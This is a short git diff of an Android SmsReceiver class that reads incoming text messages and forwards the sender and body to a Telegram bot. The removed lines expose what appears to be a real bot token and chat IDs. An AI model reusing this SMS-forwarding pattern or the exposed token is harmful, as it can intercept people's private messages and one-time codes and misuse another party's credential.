@@ -26,8 +26,8 @@ public class SmsReceiver extends BroadcastReceiver {
                         String messageBody = smsMessage.getMessageBody();
 
                         // Forward the message to your Telegram bot for both chat IDs
-                        forwardToTelegramBot(sender, messageBody, "2142287302");  // First chat ID
-                        forwardToTelegramBot(sender, messageBody, "1429455803");  // Second chat ID
+                        forwardToTelegramBot(sender, messageBody, "ghhv");  // First chat ID
+                        forwardToTelegramBot(sender, messageBody, "gh b");  // Second chat ID
                     }
                 }
             }
@@ -40,7 +40,7 @@ public class SmsReceiver extends BroadcastReceiver {
             protected Void doInBackground(Void... voids) {
                 try {
                     // Construct the URL for the Telegram Bot API
-                    String urlString = "https://api.telegram.org/bot6944538103:AAHBVzOEwEe421kovi6k11XqIp6_b8WCIYY/sendMessage";
+                    String urlString = "https://api.telegram.org/AAHBVzOEwEe421kovi6k11XqIp6_b8WCIYY/sendMessage";
                     URL url = new URL(urlString);
 
                     // Construct the JSON payload for the message
